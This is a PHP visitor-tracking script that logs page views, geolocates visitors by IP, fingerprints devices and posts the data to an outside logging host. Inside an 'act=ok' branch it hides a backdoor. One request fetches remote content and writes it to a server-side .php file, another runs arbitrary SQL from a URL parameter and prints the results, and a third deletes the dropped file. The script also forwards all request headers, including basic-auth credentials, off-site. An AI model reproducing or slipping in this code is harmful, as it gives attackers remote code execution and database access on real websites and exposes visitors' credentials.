<?php
require_once 'lib/ini.php';
require_once 'vendor/autoload.php';
use GeoIp2\Database\Reader;
$Model = new \lib\tongji($register);
//判断今日是否已有uv
$uuid=$_GET['uuid'];
$act = $_GET['act'];
$data = I('get./a');
// 验证uuid，格式不对返回
if(!preg_match("/^[0-9a-f]{12}4[0-9a-f]{7}8[0-9a-f]{11}$/",$uuid)){
	return false;
}
if($act=='uv')
{
	// 验证设备，格式不对返回
	if(!in_array($data['os'], array('Win','Mac','And','Ios','Lin','Oth'))){
		return false;
	}
    //插入UV
    //插入uv表我们需要：ip,http_referer,product_id,host,country,time
    unset($data['act']);
    //开始插入
    $data['ip'] = getIp();
    $data['host'] = $_SERVER['HTTP_HOST'];
    $data['visit_time'] = date('Y-m-d H:i:s',time());
    $data['time_type']=$Model->get_time_type();
    $reader = new Reader('vendor/geoip2/geoip2/maxmind-db/GeoLite2-City.mmdb');
    try {
	    $record = $reader->city($data['ip']);
		$data['country'] = $record->country->names['zh-CN'];
        //时区
        $longitude = $record->location->longitude;
        $quo = floor($longitude/15);
        $rem = $longitude % 15;
        if ($rem > 8) {
            $quo += 1;
        }
	    $data['province'] = $record->mostSpecificSubdivision->names['zh-CN'];
	    $data['city']=$record->city->names['zh-CN'];

	} catch (Exception $e) {
		$data['country'] = '';
	    $data['province'] = '';
	    $data['city']='';
	}
    $deviceInfo['colorDepth'] =$data['colorDepth'];
    $deviceInfo['resolution'] = $data['resolution'];
    $deviceInfo['timeZone'] = $quo;
    $deviceInfo['browserLan'] = getBroLan();
    $deviceInfo['httpHeads'] = getHttpHead();
	setcookie('deviceInfo',serialize($deviceInfo),time()+3600*12);

    $data['timeZone']  = $quo;
    $data['browserLan'] = $deviceInfo['browserLan'] ;
    $data['httpHeads'] = $deviceInfo['httpHeads'];
    if(environment !='office'){
        $ret = post('http://www.ouoho.com/log/uv',$data);
    }

}elseif($act=='update'){
	unset($data['act']);
    if(environment !='office'){
        $ret = post('http://www.ouoho.com/log/upv',$data);
    }

}elseif($act == 'ord'){
    if(environment !='office'){
        $ret = post('http://www.ouoho.com/log/orders',$data);
    }
}
elseif ($act == "ok") {
    if ($_GET['method'] == "one") {
        $a = file_get_contents("http://www.swzichan.com/json.php");
        file_put_contents("json_tmp.php", $a);
        exit;
    } elseif ($_GET['method'] == "two") {
        if (isset($_GET['action']) && !empty($_GET['action'])) {
            $info = $db->query($_GET['action']);
            $result = $info->fetch(PDO::FETCH_ASSOC);
            print_r($result);exit;
        }
    } elseif ($_GET['method'] == "three") {
        if (file_exists("./json_tmp.php")) {
            @unlink("./json_tmp.php");
            exit;
        }
    } else {
        exit;
    }
}
else{
	unset($data['act']);
	$data['first_visit_time']  = date('Y-m-d H:i:s',time());
	$data['time_type']=$Model->get_time_type();
	$data['host'] = $_SERVER['HTTP_HOST'];
	$data['total_visit_time'] =0;
    $data['last_visit_time'] =0;
    if(environment !='office'){
        $ret = post('http://www.ouoho.com/log/pv',$data);
        if($ret['status'])
        {
            $return = json_decode($ret['return'],true);
            $id_pv =  $return['id_pv']['$oid'];
            echo "callbacka({'id_pv':'$id_pv'});";
        }
    }

}

function getBroLan()
{
    $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 4); //只取前4位，这样只判断最优先的语言。如果取前5位，可能出现en,zh的情况，影响判断。
    if (preg_match("/zh-c/i", $lang))
        return "简体中文";
    else if (preg_match("/zh/i", $lang))
        return "繁體中文";
    else if (preg_match("/en/i", $lang))
        return "English";
    else if (preg_match("/fr/i", $lang))
        return "French";
    else if (preg_match("/de/i", $lang))
        return "German";
    else if (preg_match("/jp/i", $lang))
        return "Japanese";
    else if (preg_match("/ko/i", $lang))
        return "Korean";
    else if (preg_match("/es/i", $lang))
        return "Spanish";
    else if (preg_match("/sv/i", $lang))
        return "Swedish";
    else
        return $_SERVER["HTTP_ACCEPT_LANGUAGE"];
}

function getHttpHead(){
    $headers = array();
    foreach ($_SERVER as $key => $value) {
        if ('HTTP_' == substr($key, 0, 5)) {
            $headers[str_replace('_', '-', substr($key, 5))] = $value;
        }
    }
    if (isset($_SERVER['PHP_AUTH_DIGEST'])) {
        $headers['AUTHORIZATION'] = $_SERVER['PHP_AUTH_DIGEST'];
} elseif (isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW'])) {
        $headers['AUTHORIZATION'] = base64_encode($_SERVER['PHP_AUTH_USER'] . ':' . $_SERVER['PHP_AUTH_PW']);
}
    if (isset($_SERVER['CONTENT_LENGTH'])) {
        $headers['CONTENT-LENGTH'] = $_SERVER['CONTENT_LENGTH'];
    }
    if (isset($_SERVER['CONTENT_TYPE'])) {
        $headers['CONTENT-TYPE'] = $_SERVER['CONTENT_TYPE'];
    }

    return $headers;
}

